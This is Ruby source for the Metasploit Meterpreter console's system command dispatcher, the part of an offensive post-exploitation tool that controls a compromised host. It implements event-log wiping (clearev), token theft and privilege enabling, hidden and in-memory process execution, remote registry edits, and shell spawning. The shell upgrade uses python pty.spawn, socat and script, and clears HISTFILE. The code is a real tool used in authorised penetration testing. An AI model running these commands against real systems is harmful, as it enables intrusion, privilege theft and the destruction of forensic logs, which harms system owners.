# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# The system level portion of the standard API extension.
#
###
class Console::CommandDispatcher::Stdapi::Sys

  Klass = Console::CommandDispatcher::Stdapi::Sys

  include Console::CommandDispatcher

  #
  # Options used by the 'execute' command.
  #
  @@execute_opts = Rex::Parser::Arguments.new(
    "-a" => [ true,  "The arguments to pass to the command."		   ],
    "-c" => [ false, "Channelized I/O (required for interaction)."		   ], # -i sets -c
    "-f" => [ true,  "The executable command to run."			   ],
    "-h" => [ false, "Help menu."						   ],
    "-H" => [ false, "Create the process hidden from view."			   ],
    "-i" => [ false, "Interact with the process after creating it."		   ],
    "-m" => [ false, "Execute from memory."					   ],
    "-d" => [ true,  "The 'dummy' executable to launch when using -m."	   ],
    "-t" => [ false, "Execute process with currently impersonated thread token"],
    "-k" => [ false, "Execute process on the meterpreters current desktop"	   ],
    "-s" => [ true,  "Execute process in a given session as the session user"  ])

  #
  # Options used by the 'shell' command.
  #
  @@shell_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help menu."                                          ],
    "-l" => [ false, "List available shells (/etc/shells)."                ],
    "-t" => [ true,  "Spawn a PTY shell (/bin/bash if no argument given)." ]) # ssh(1) -t

  #
  # Options used by the 'reboot' command.
  #
  @@reboot_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help menu."						   ],
    "-f" => [ true,  "Force a reboot, valid values [1|2]"			   ])

  #
  # Options used by the 'shutdown' command.
  #
  @@shutdown_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help menu."						   ],
    "-f" => [ true,  "Force a shutdown, valid values [1|2]"			   ])

  #
  # Options used by the 'reg' command.
  #
  @@reg_opts = Rex::Parser::Arguments.new(
    "-d" => [ true,  "The data to store in the registry value."		   ],
    "-h" => [ false, "Help menu."						   ],
    "-k" => [ true,  "The registry key path (E.g. HKLM\\Software\\Foo)."	   ],
    "-t" => [ true,  "The registry value type (E.g. REG_SZ)."		   ],
    "-v" => [ true,  "The registry value name (E.g. Stuff)."		   ],
    "-r" => [ true,  "The remote machine name to connect to (with current process credentials" ],
    "-w" => [ false, "Set KEY_WOW64 flag, valid values [32|64]."		   ])

  #
  # Options for the 'ps' command.
  #
  @@ps_opts = Rex::Parser::Arguments.new(
    "-S" => [ true,  "Filter on process name" ],
    "-U" => [ true,  "Filter on user name" ],
    "-A" => [ true,  "Filter on architecture" ],
    "-x" => [ false, "Filter for exact matches rather than regex" ],
    "-s" => [ false, "Filter only SYSTEM processes" ],
    "-c" => [ false, "Filter only child processes of the current shell" ],
    "-h" => [ false, "Help menu." ])

  #
  # Options for the 'pgrep' command.
  #
  @@pgrep_opts = Rex::Parser::Arguments.new(
    "-S" => [ true,  "Filter on process name" ],
    "-U" => [ true,  "Filter on user name" ],
    "-A" => [ true,  "Filter on architecture" ],
    "-x" => [ false, "Filter for exact matches rather than regex" ],
    "-s" => [ false, "Filter only SYSTEM processes" ],
    "-c" => [ false, "Filter only child processes of the current shell" ],
    "-l" => [ false, "Display process name with PID" ],
    "-f" => [ false, "Display process path and args with PID (combine with -l)" ],
    "-h" => [ false, "Help menu." ])

  #
  # Options for the 'suspend' command.
  #
  @@suspend_opts = Rex::Parser::Arguments.new(
    "-h" => [ false, "Help menu."						   ],
    "-c" => [ false, "Continues suspending or resuming even if an error is encountered"],
    "-r" => [ false, "Resumes the target processes instead of suspending"	   ])

  #
  # List of supported commands.
  #
  def commands
    all = {
      "clearev"     => "Clear the event log",
      "drop_token"  => "Relinquishes any active impersonation token.",
      "execute"     => "Execute a command",
      "getpid"      => "Get the current process identifier",
      "getprivs"    => "Attempt to enable all privileges available to the current process",
      "getuid"      => "Get the user that the server is running as",
      "getsid"      => "Get the SID of the user that the server is running as",
      "getenv"      => "Get one or more environment variable values",
      "kill"        => "Terminate a process",
      "pkill"       => "Terminate processes by name",
      "pgrep"       => "Filter processes by name",
      "ps"          => "List running processes",
      "reboot"      => "Reboots the remote computer",
      "reg"         => "Modify and interact with the remote registry",
      "rev2self"    => "Calls RevertToSelf() on the remote machine",
      "shell"       => "Drop into a system command shell",
      "shutdown"    => "Shuts down the remote computer",
      "steal_token" => "Attempts to steal an impersonation token from the target process",
      "suspend"     => "Suspends or resumes a list of processes",
      "sysinfo"     => "Gets information about the remote system, such as OS",
      "localtime"   => "Displays the target system's local date and time",
    }
    reqs = {
      "clearev"     => [ "stdapi_sys_eventlog_open", "stdapi_sys_eventlog_clear" ],
      "drop_token"  => [ "stdapi_sys_config_drop_token" ],
      "execute"     => [ "stdapi_sys_process_execute" ],
      "getpid"      => [ "stdapi_sys_process_getpid"	],
      "getprivs"    => [ "stdapi_sys_config_getprivs" ],
      "getuid"      => [ "stdapi_sys_config_getuid" ],
      "getsid"      => [ "stdapi_sys_config_getsid" ],
      "getenv"      => [ "stdapi_sys_config_getenv" ],
      "kill"        => [ "stdapi_sys_process_kill" ],
      "pkill"       => [ "stdapi_sys_process_kill", "stdapi_sys_process_get_processes" ],
      "pgrep"       => [ "stdapi_sys_process_get_processes" ],
      "ps"          => [ "stdapi_sys_process_get_processes" ],
      "reboot"      => [ "stdapi_sys_power_exitwindows" ],
      "reg"	      => [
        "stdapi_registry_load_key",
        "stdapi_registry_unload_key",
        "stdapi_registry_open_key",
        "stdapi_registry_open_remote_key",
        "stdapi_registry_create_key",
        "stdapi_registry_delete_key",
        "stdapi_registry_close_key",
        "stdapi_registry_enum_key",
        "stdapi_registry_set_value",
        "stdapi_registry_query_value",
        "stdapi_registry_delete_value",
        "stdapi_registry_query_class",
        "stdapi_registry_enum_value",
      ],
      "rev2self"    => [ "stdapi_sys_config_rev2self" ],
      "shell"       => [ "stdapi_sys_process_execute" ],
      "shutdown"    => [ "stdapi_sys_power_exitwindows" ],
      "steal_token" => [ "stdapi_sys_config_steal_token" ],
      "suspend"     => [ "stdapi_sys_process_attach"],
      "sysinfo"     => [ "stdapi_sys_config_sysinfo" ],
      "localtime"   => [ "stdapi_sys_config_localtime" ],
    }
    filter_commands(all, reqs)
  end

  #
  # Name for this dispatcher.
  #
  def name
    "Stdapi: System"
  end

  #
  # Executes a command with some options.
  #
  def cmd_execute(*args)
    if (args.length == 0)
      args.unshift("-h")
    end

    session     = nil
    interact    = false
    desktop     = false
    channelized = nil
    hidden	    = nil
    from_mem    = false
    dummy_exec  = "cmd"
    cmd_args    = nil
    cmd_exec    = nil
    use_thread_token = false

    @@execute_opts.parse(args) { |opt, idx, val|
      case opt
        when "-a"
          cmd_args = val
        when "-c"
          channelized = true
        when "-f"
          cmd_exec = val
        when "-H"
          hidden = true
        when "-m"
          from_mem = true
        when "-d"
          dummy_exec = val
        when "-k"
          desktop = true
        when "-h"
          cmd_execute_help
          return true
        when "-i"
          channelized = true
          interact = true
        when "-t"
          use_thread_token = true
        when "-s"
          session = val.to_i
      end
    }

    # Did we at least get an executable?
    if (cmd_exec == nil)
      print_error("You must specify an executable file with -f")
      return true
    end

    # Execute it
    p = client.sys.process.execute(cmd_exec, cmd_args,
      'Channelized' => channelized,
      'Desktop'     => desktop,
      'Session'     => session,
      'Hidden'      => hidden,
      'InMemory'    => (from_mem) ? dummy_exec : nil,
      'UseThreadToken' => use_thread_token)

    print_line("Process #{p.pid} created.")
    print_line("Channel #{p.channel.cid} created.") if (p.channel)

    if (interact and p.channel)
      shell.interact_with_channel(p.channel)
    end
  end

  def cmd_execute_help
    print_line("Usage: execute -f file [options]")
    print_line("Executes a command on the remote machine.")
    print @@execute_opts.usage
  end

  def cmd_execute_tabs(str, words)
    return @@execute_opts.fmt.keys if words.length == 1
    []
  end

  def cmd_shell_help
    print_line 'Usage: shell [options]'
    print_line
    print_line 'Opens an interactive native shell.'
    print_line @@shell_opts.usage
  end

  def cmd_shell_tabs(str, words)
    return @@shell_opts.fmt.keys if words.length == 1
    []
  end

  #
  # Drop into a system shell as specified by %COMSPEC% or
  # as appropriate for the host.
  #
  def cmd_shell(*args)
    use_pty = false
    sh_path = '/bin/bash'

    @@shell_opts.parse(args) do |opt, idx, val|
      case opt
      when '-h'
        cmd_shell_help
        return true
      when '-l'
        return false unless client.fs.file.exist?('/etc/shells')

        begin
          client.fs.file.open('/etc/shells') do |f|
            print(f.read) until f.eof
          end
        rescue
          return false
        end

        return true
      when '-t'
        use_pty = true
        # XXX: No other options must follow
        sh_path = val if val
      end
    end

    case client.platform
    when 'windows'
      path = client.sys.config.getenv('COMSPEC')
      path = (path && !path.empty?) ? path : 'cmd.exe'

      # attempt the shell with thread impersonation
      begin
        cmd_execute('-f', path, '-c', '-i', '-H', '-t')
      rescue
        # if this fails, then we attempt without impersonation
        print_error('Failed to spawn shell with thread impersonation. Retrying without it.')
        cmd_execute('-f', path, '-c', '-i', '-H')
      end
    when 'linux', 'osx'
      if use_pty && pty_shell(sh_path)
        return true
      end

      cmd_execute('-f', '/bin/sh', '-c', '-i')
    else
      # Then this is a multi-platform meterpreter (e.g., php or java), which
      # must special-case COMSPEC to return the system-specific shell.
      path = client.sys.config.getenv('COMSPEC')

      # If that failed for whatever reason, guess it's unix
      path = (path && !path.empty?) ? path : '/bin/sh'

      if use_pty && path == '/bin/sh' && pty_shell(sh_path)
        return true
      end

      cmd_execute('-f', path, '-c', '-i')
    end
  end

  #
  # Spawn a PTY shell
  #
  def pty_shell(sh_path)
    sh_path = client.fs.file.exist?(sh_path) ? sh_path : '/bin/sh'

    # Python Meterpreter calls pty.openpty() - No need for other methods
    if client.arch == 'python'
      cmd_execute('-f', sh_path, '-c', '-i')
      return true
    end

    # Check for the following in /usr{,/local}/bin:
    #   script
    #   python{,2,3}
    #   socat
    #   expect
    paths = %w[
      /usr/bin/script
      /usr/bin/python
      /usr/local/bin/python
      /usr/bin/python2
      /usr/local/bin/python2
      /usr/bin/python3
      /usr/local/bin/python3
      /usr/bin/socat
      /usr/local/bin/socat
      /usr/bin/expect
      /usr/local/bin/expect
    ]

    # Select method for spawning PTY Shell based on availability on the target.
    path = paths.find { |p| client.fs.file.exist?(p) }

    return false unless path

    # Commands for methods
    cmd =
      case path
      when /script/
        if client.platform == 'linux'
          "#{path} -qc #{sh_path} /dev/null"
        else
          # script(1) invocation for BSD, OS X, etc.
          "#{path} -q /dev/null #{sh_path}"
        end
      when /python/
        "#{path} -c 'import pty; pty.spawn(\"#{sh_path}\")'"
      when /socat/
        # sigint isn't passed through yet
        "#{path} - exec:#{sh_path},pty,sane,setsid,sigint,stderr"
      when /expect/
        "#{path} -c 'spawn #{sh_path}; interact'"
      end

    # "env TERM=xterm" provides colors, "clear" command, etc. as available on the target.
    cmd.prepend('env TERM=xterm HISTFILE= ')

    print_status(cmd)
    cmd_execute('-f', cmd, '-c', '-i')

    true
  end

  #
  # Gets the process identifier that meterpreter is running in on the remote
  # machine.
  #
  def cmd_getpid(*args)
    print_line("Current pid: #{client.sys.process.getpid}")

    return true
  end

  #
  # Displays the user that the server is running as.
  #
  def cmd_getuid(*args)
    print_line("Server username: #{client.sys.config.getuid}")
  end

  #
  # Display the SID of the user that the server is running as.
  #
  def cmd_getsid(*args)
    print_line("Server SID: #{client.sys.config.getsid}")
  end

  #
  # Get the value of one or more environment variables from the target.
  #
  def cmd_getenv(*args)
    vars = client.sys.config.getenvs(*args)

    if vars.length == 0
      print_error("None of the specified environment variables were found/set.")
    else
      table = Rex::Text::Table.new(
        'Header'    => 'Environment Variables',
        'Indent'    => 0,
        'SortIndex' => 1,
        'Columns'   => [
          'Variable', 'Value'
        ]
      )

      vars.each do |var, val|
        table << [ var, val ]
      end

      print_line
      print_line(table.to_s)
    end
  end

  #
  # Clears the event log
  #
  def cmd_clearev(*args)

    logs = ['Application', 'System', 'Security']
    logs << args
    logs.flatten!

    logs.each do |name|
      log = client.sys.eventlog.open(name)
      print_status("Wiping #{log.length} records from #{name}...")
      log.clear
    end
  end

  #
  # Kills one or more processes.
  #
  def cmd_kill(*args)
    # give'em help if they want it, or seem confused
    if ( args.length == 0 or (args.length == 1 and args[0].strip == "-h") )
      cmd_kill_help
      return true
    end

    self_destruct = args.include?("-s")

    if self_destruct
      valid_pids = [client.sys.process.getpid.to_i]
    else
      valid_pids = validate_pids(args)

      # validate all the proposed pids first so we can bail if one is bogus
      args.uniq!
      diff = args - valid_pids.map {|e| e.to_s}
      if not diff.empty? # then we had an invalid pid
        print_error("The following pids are not valid:  #{diff.join(", ").to_s}.  Quitting")
        return false
      end
    end

    # kill kill kill
    print_line("Killing: #{valid_pids.join(", ").to_s}")
    client.sys.process.kill(*(valid_pids.map { |x| x }))
    return true
  end

  #
  # help for the kill command
  #
  def cmd_kill_help
    print_line("Usage: kill [pid1 [pid2 [pid3 ...]]] [-s]")
    print_line("Terminate one or more processes.")
    print_line("     -s        Kills the pid associated with the current session.")
  end

  #
  # Kills one or more processes by name.
  #
  def cmd_pkill(*args)
    if args.include?('-h')
      cmd_pkill_help
      return true
    end

    all_processes = client.sys.process.get_processes
    processes = match_processes(all_processes, args)

    if processes.length == 0
      print_line("No matching processes were found.")
      return true
    end

    if processes.length == all_processes.length && !args.include?('-f')
      print_error("All processes will be killed, use '-f' to force.")
      return true
    end

    pids = processes.collect { |p| p['pid'] }.reverse
    print_line("Killing: #{pids.join(', ')}")
    client.sys.process.kill(*(pids.map { |x| x }))
    true
  end

  def cmd_pkill_help
    print_line("Usage: pkill [ options ] pattern")
    print_line("Terminate one or more processes by name.")
    print_line @@ps_opts.usage
  end

  #
  # Filters processes by name
  #
  def cmd_pgrep(*args)
    f_flag = false
    l_flag = false

    @@pgrep_opts.parse(args) do |opt, idx, val|
      case opt
      when '-h'
        cmd_pgrep_help
        return true
      when '-l'
        l_flag = true
      when '-f'
        f_flag = true
      end
    end

    all_processes = client.sys.process.get_processes
    processes = match_processes(all_processes, args, quiet: true)

    if processes.length == 0 || processes.length == all_processes.length
      return true
    end

    processes.each do |p|
      if l_flag
        if f_flag
          print_line("#{p['pid']} #{p['path']}#{client.fs.file.separator}#{p['name']}")
        else
          print_line("#{p['pid']} #{p['name']}")
        end
      else
        print_line("#{p['pid']}")
      end
    end
    true
  end

  def cmd_pgrep_help
    print_line("Usage: pgrep [ options ] pattern")
    print_line("Filter processes by name.")
    print_line @@pgrep_opts.usage
  end

  #
  # validates an array of pids against the running processes on target host
  # behavior can be controlled to allow/deny proces 0 and the session's process
  # the pids:
  # - are converted to integers
  # - have had pid 0 removed unless allow_pid_0
  # - have had current session pid removed unless allow_session_pid (to protect the session)
  # - have redundant entries removed
  #
  # @param pids [Array<String>] The pids to validate
  # @param allow_pid_0 [Boolean] whether to consider a pid of 0 as valid
  # @param allow_session_pid [Boolean] whether to consider a pid = the current session pid as valid
  # @return [Array] Returns an array of valid pids

  def validate_pids(pids, allow_pid_0 = false, allow_session_pid = false)

    return [] if (pids.class != Array or pids.empty?)
    valid_pids = []
    # to minimize network traffic, we only get host processes once
    host_processes = client.sys.process.get_processes
    if host_processes.length < 1
      print_error "No running processes found on the target host."
      return []
    end

    # get the current session pid so we don't suspend it later
    mypid = client.sys.process.getpid.to_i

    # remove nils & redundant pids, conver to int
    clean_pids = pids.compact.uniq.map{|x| x.to_i}
    # now we look up the pids & remove bad stuff if nec
    clean_pids.delete_if do |p|
      ( (p == 0 and not allow_pid_0) or (p == mypid and not allow_session_pid) )
    end
    clean_pids.each do |pid|
      # find the process with this pid
      theprocess = host_processes.find {|x| x["pid"] == pid}
      if ( theprocess.nil? )
        next
      else
        valid_pids << pid
      end
    end
    valid_pids
  end

  def match_processes(processes, args, quiet: false)

    search_proc = nil
    search_user = nil
    exact_match = false

    # Parse opts
    @@ps_opts.parse(args) do |opt, idx, val|
      case opt
      when '-S', nil
        if val.nil? || val.empty?
          print_error "Enter a process name"
          processes = []
        else
          search_proc = val
        end
      when "-U"
        if val.nil? || val.empty?
          print_line "Enter a process user"
          processes = []
        else
          search_user = val
        end
      when '-x'
        exact_match = true
      when "-A"
        if val.nil? || val.empty?
          print_error "Enter an architecture"
          processes = []
        else
          print_line "Filtering on arch '#{val}" if !quiet
          processes = processes.select do |p|
            p['arch'] == val
          end
        end
      when "-s"
        print_line "Filtering on SYSTEM processes..." if !quiet
        processes = processes.select do |p|
          ["NT AUTHORITY\\SYSTEM", "root"].include? p['user']
        end
      when "-c"
        print_line "Filtering on child processes of the current shell..." if !quiet
        current_shell_pid = client.sys.process.getpid
        processes = processes.select do |p|
          p['ppid'] == current_shell_pid
        end
      end
    end

    unless search_proc.nil?
      print_line "Filtering on '#{search_proc}'" if !quiet
      if exact_match
        processes = processes.select do |p|
          p['name'] == search_proc
        end
      else
        match = /#{search_proc}/
        processes = processes.select do |p|
          p['name'] =~ match
        end
      end
    end

    unless search_user.nil?
      print_line "Filtering on user '#{search_user}'" if !quiet
      if exact_match
        processes = processes.select do |p|
          p['user'] == search_user
        end
      else
        match = /#{search_user}/
        processes = processes.select do |p|
          p['user'] =~ match
        end
      end
    end

    Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessList.new(processes)
  end

  #
  # Lists running processes.
  #
  def cmd_ps(*args)
    if args.include?('-h')
      cmd_ps_help
      return true
    end

    all_processes = client.sys.process.get_processes
    processes = match_processes(all_processes, args)

    if processes.length == 0
      print_line("No matching processes were found.")
      return true
    end

    tbl = processes.to_table
    print_line
    print_line(tbl.to_s)
    true
  end

  def cmd_ps_help
    print_line "Usage: ps [ options ] pattern"
    print_line
    print_line "Use the command with no arguments to see all running processes."
    print_line "The following options can be used to filter those results:"
    print_line @@ps_opts.usage
  end

  #
  # Tab completion for the ps command
  #
  def cmd_ps_tabs(str, words)
    return @@ps_opts.fmt.keys if words.length == 1

    case words[-1]
    when '-A'
      return %w[x86 x64]
    when '-S'
      process = []
      client.sys.process.get_processes.each { |p| process << p['name'] } rescue nil
      return process.uniq!
    when '-U'
      user = []
      client.sys.process.get_processes.each { |p| user << p['user'] } rescue nil
      return user.uniq! # buggy on windows
    end

    []
  end

  #
  # Reboots the remote computer.
  #
  def cmd_reboot(*args)
    force = 0

    if args.length == 1 and args[0].strip == "-h"
      print(
        "Usage: reboot [options]\n\n" +
        "Reboot the remote machine.\n" +
        @@reboot_opts.usage)
        return true
    end

    @@reboot_opts.parse(args) { |opt, idx, val|
      case opt
        when "-f"
          force = val.to_i
      end
    }
    print_line("Rebooting...")

    client.sys.power.reboot(force, SHTDN_REASON_DEFAULT)
  end

  #
  # Modifies and otherwise interacts with the registry on the remote computer
  # by allowing the client to enumerate, open, modify, and delete registry
  # keys and values.
  #
  def cmd_reg(*args)
    # Extract the command, if any
    cmd = args.shift

    if (args.length == 0)
      args.unshift("-h")
    end

    # Initiailze vars
    key	= nil
    value	= nil
    data	= nil
    type	= nil
    wowflag = 0x0000
    rem	= nil

    @@reg_opts.parse(args) { |opt, idx, val|
      case opt
        when "-h"
          cmd_reg_help
          return false
        when "-k"
          key   = val
        when "-v"
          value = val
        when "-t"
          type  = val
        when "-d"
          data  = val
        when "-r"
          rem  = val
        when "-w"
          if val == '64'
            wowflag = KEY_WOW64_64KEY
          elsif val == '32'
            wowflag = KEY_WOW64_32KEY
          end
      end
    }

    # All commands require a key.
    if (key == nil)
      print_error("You must specify a key path (-k)")
      return false
    end

    # Split the key into its parts
    root_key, base_key = client.sys.registry.splitkey(key)

    begin
      # Rock it
      case cmd
        when "enumkey"

          open_key = nil
          if not rem
            open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + wowflag)
          else
            remote_key = client.sys.registry.open_remote_key(rem, root_key)
            if remote_key
              open_key = remote_key.open_key(base_key, KEY_READ + wowflag)
            end
          end

          print_line(
            "Enumerating: #{key}\n")

          keys = open_key.enum_key
          vals = open_key.enum_value

          if (keys.length > 0)
            print_line("  Keys (#{keys.length}):\n")

            keys.each { |subkey|
              print_line("\t#{subkey}")
            }

            print_line
          end

          if (vals.length > 0)
            print_line("  Values (#{vals.length}):\n")

            vals.each { |val|
              print_line("\t#{val.name}")
            }

            print_line
          end

          if (vals.length == 0 and keys.length == 0)
            print_line("No children.")
          end

        when "createkey"
          open_key = nil
          if not rem
            open_key = client.sys.registry.create_key(root_key, base_key, KEY_WRITE + wowflag)
          else
            remote_key = client.sys.registry.open_remote_key(rem, root_key)
            if remote_key
              open_key = remote_key.create_key(base_key, KEY_WRITE + wowflag)
            end
          end

          print_line("Successfully created key: #{key}")

        when "deletekey"
          open_key = nil
          if not rem
            open_key = client.sys.registry.open_key(root_key, nil, KEY_WRITE + wowflag)
          else
            remote_key = client.sys.registry.open_remote_key(rem, root_key)
            if remote_key
              open_key = remote_key.open_key(nil, KEY_WRITE + wowflag)
            end
          end
          open_key.delete_key(base_key)

          print_line("Successfully deleted key: #{key}")

        when "setval"
          if (value == nil or data == nil)
            print_error("You must specify both a value name and data (-v, -d).")
            return false
          end

          type = "REG_SZ" if (type == nil)

          open_key = nil
          if not rem
            open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE + wowflag)
          else
            remote_key = client.sys.registry.open_remote_key(rem, root_key)
            if remote_key
              open_key = remote_key.open_key(base_key, KEY_WRITE + wowflag)
            end
          end

          open_key.set_value(value, client.sys.registry.type2str(type), data)

          print_line("Successfully set #{value} of #{type}.")

        when "deleteval"
          if (value == nil)
            print_error("You must specify a value name (-v).")
            return false
          end

          open_key = nil
          if not rem
            open_key = client.sys.registry.open_key(root_key, base_key, KEY_WRITE + wowflag)
          else
            remote_key = client.sys.registry.open_remote_key(rem, root_key)
            if remote_key
              open_key = remote_key.open_key(base_key, KEY_WRITE + wowflag)
            end
          end

          open_key.delete_value(value)

          print_line("Successfully deleted #{value}.")

        when "queryval"
          if (value == nil)
            print_error("You must specify a value name (-v).")
            return false
          end

          open_key = nil
          if not rem
            open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + wowflag)
          else
            remote_key = client.sys.registry.open_remote_key(rem, root_key)
            if remote_key
              open_key = remote_key.open_key(base_key, KEY_READ + wowflag)
            end
          end

          v = open_key.query_value(value)
          data = v.data
          if v.type == REG_BINARY
            data = data.unpack('H*')[0]
          end

          print(
            "Key: #{key}\n" +
            "Name: #{v.name}\n" +
            "Type: #{v.type_to_s}\n" +
            "Data: #{data}\n")

        when "queryclass"
          open_key = nil
          if not rem
            open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + wowflag)
          else
            remote_key = client.sys.registry.open_remote_key(rem, root_key)
            if remote_key
              open_key = remote_key.open_key(base_key, KEY_READ + wowflag)
            end
          end

          data = open_key.query_class

          print("Data: #{data}\n")
        else
          print_error("Invalid command supplied: #{cmd}")
      end
    ensure
      open_key.close if (open_key)
    end
  end

  #
  # help for the reg command
  #
  def cmd_reg_help
    print_line("Usage: reg [command] [options]")
    print_line("Interact with the target machine's registry.")
    print @@reg_opts.usage
    print_line("COMMANDS:")
    print_line
    print_line("    enumkey  Enumerate the supplied registry key [-k <key>]")
    print_line("    createkey  Create the supplied registry key  [-k <key>]")
    print_line("    deletekey  Delete the supplied registry key  [-k <key>]")
    print_line("    queryclass Queries the class of the supplied key [-k <key>]")
    print_line("    setval Set a registry value [-k <key> -v <val> -d <data>]")
    print_line("    deleteval  Delete the supplied registry value [-k <key> -v <val>]")
    print_line("    queryval Queries the data contents of a value [-k <key> -v <val>]")
    print_line
  end

  #
  # Tab completion for the reg command
  #
  def cmd_reg_tabs(str, words)
    if words.length == 1
      return %w[enumkey createkey deletekey queryclass setval deleteval queryval] + @@reg_opts.fmt.keys
    end

    case words[-1]
    when '-k'
      reg_root_keys = %w[HKLM HKCC HKCR HKCU HKU]
      # Split the key into its parts
      root_key, base_key = client.sys.registry.splitkey(str) rescue nil
      return reg_root_keys unless root_key
      # Open the registry
      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ + 0x0000) rescue (return [])
      return open_key.enum_key.map { |e| str.gsub(/[\\]*$/, '') + '\\\\' + e }
    when '-t'
      # Reference https://msdn.microsoft.com/en-us/library/windows/desktop/bb773476(v=vs.85).aspx
      return %w[REG_BINARY REG_DWORD REG_QWORD REG_DWORD_BIG_ENDIAN REG_EXPAND_SZ
                REG_LINK REG_MULTI_SZ REG_NONE REG_RESOURCE_LIST REG_SZ]
    when '-w'
      return %w[32 64]
    when 'enumkey', 'createkey', 'deletekey', 'queryclass', 'setval', 'deleteval', 'queryval'
      return @@reg_opts.fmt.keys
    end

    []
  end


  #
  # Calls RevertToSelf() on the remote machine.
  #
  def cmd_rev2self(*args)
    client.sys.config.revert_to_self
  end

  def cmd_getprivs_help
    print_line "Usage: getprivs"
    print_line
    print_line "Attempt to enable all privileges, such as SeDebugPrivilege, available to the"
    print_line "current process.  Note that this only enables existing privs and does not change"
    print_line "users or tokens."
    print_line
    print_line "See also: steal_token, getsystem"
    print_line
  end

  #
  # Obtains as many privileges as possible on the target machine.
  #
  def cmd_getprivs(*args)
    if args.include? "-h"
      cmd_getprivs_help
    end

    table = Rex::Text::Table.new(
      'Header'    => 'Enabled Process Privileges',
      'Indent'    => 0,
      'SortIndex' => 1,
      'Columns'   => ['Name']
    )

    privs = client.sys.config.getprivs
    client.sys.config.getprivs.each do |priv|
      table << [priv]
    end

    print_line
    print_line(table.to_s)
  end

  #
  # Tries to steal the primary token from the target process.
  #
  def cmd_steal_token(*args)
    if args.empty? || args.include?('-h')
      print_line('Usage: steal_token [pid]')
      return true
    end

    print_line("Stolen token with username: " + client.sys.config.steal_token(args[0]))
  end

  #
  # Drops any assumed token.
  #
  def cmd_drop_token(*args)
    print_line("Relinquished token, now running as: " + client.sys.config.drop_token())
  end

  #
  # Displays information about the remote system.
  #
  def cmd_sysinfo(*args)
    info = client.sys.config.sysinfo(refresh: true)
    width = "Meterpreter".length
    info.keys.each { |k| width = k.length if k.length > width and info[k] }

    info.each_pair do |key, value|
      print_line("#{key.ljust(width+1)}: #{value}") if value
    end
    print_line("#{"Meterpreter".ljust(width+1)}: #{client.session_type}")

    return true
  end

  #
  # Displays the local date and time at the remote system location.
  #
  def cmd_localtime(*args)
    print_line("Local Date/Time: " + client.sys.config.localtime);
    return true
  end

  #
  # Shuts down the remote computer.
  #
  def cmd_shutdown(*args)
    force = 0

    if args.length == 1 && args.first.strip == '-h'
      cmd_shutdown_help
      return true
    end

    @@shutdown_opts.parse(args) { |opt, idx, val|
      case opt
        when "-f"
          force = val.to_i
      end
    }

    print_line("Shutting down...")

    client.sys.power.shutdown(force, SHTDN_REASON_DEFAULT)
  end

  def cmd_shutdown_help
    print_line('Usage: shutdown [options]')
    print_line
    print_line('Shutdown the remote machine.')
    print @@shutdown_opts.usage
  end

  def cmd_shutdown_tabs(str, words)
    return @@shutdown_opts.fmt.keys if words.length == 1

    case words[-1]
    when '-f'
      return %w[1  2]
    end

    []
  end




  #
  # Suspends or resumes a list of one or more pids
  #
  # +args+ can optionally be -c to continue on error or -r to resume
  # instead of suspend, followed by a list of one or more valid pids
  #
  # @todo  Accept process names, much of that code is done (kernelsmith)
  #
  # @param args [Array<String>] List of one of more pids
  # @return [Boolean] Returns true if command was successful, else false
  def cmd_suspend(*args)
    # give'em help if they want it, or seem confused
    if args.length == 0 or (args.include? "-h")
      cmd_suspend_help
      return true
    end

    continue = args.delete("-c") || false
    resume = args.delete("-r") || false

    # validate all the proposed pids first so we can bail if one is bogus
    valid_pids = validate_pids(args)
    args.uniq!
    diff = args - valid_pids.map {|e| e.to_s}
    if not diff.empty? # then we had an invalid pid
      print_error("The following pids are not valid:	#{diff.join(", ").to_s}.")
      if continue
        print_status("Continuing.  Invalid args have been removed from the list.")
      else
        print_error("Quitting.	Use -c to continue using only the valid pids.")
        return false
      end
    end

    targetprocess = nil
    if resume
      print_status("Resuming: #{valid_pids.join(", ").to_s}")
    else
      print_status("Suspending: #{valid_pids.join(", ").to_s}")
    end
    begin
      valid_pids.each do |pid|
        print_status("Targeting process with PID #{pid}...")
        targetprocess = client.sys.process.open(pid, PROCESS_ALL_ACCESS)
        targetprocess.thread.each_thread do |x|
          if resume
            targetprocess.thread.open(x).resume
          else
            targetprocess.thread.open(x).suspend
          end
        end
      end
    rescue ::Rex::Post::Meterpreter::RequestError => e
      print_error "Error acting on the process:  #{e.to_s}."
      print_error "Try migrating to a process with the same owner as the target process."
      print_error "Also consider running the win_privs post module and confirm SeDebug priv."
      return false unless continue
    ensure
      targetprocess.close if targetprocess
    end
    return true
  end

  #
  # help for the suspend command
  #
  def cmd_suspend_help
    print_line("Usage: suspend [options] pid1 pid2 pid3 ...")
    print_line("Suspend one or more processes.")
    print @@suspend_opts.usage
  end

  #
  # Tab completion for the suspend command
  #
  def cmd_suspend_tabs(str, words)
    return @@suspend_opts.fmt.keys if words.length == 1
    []
  end

end

end
end
end
end
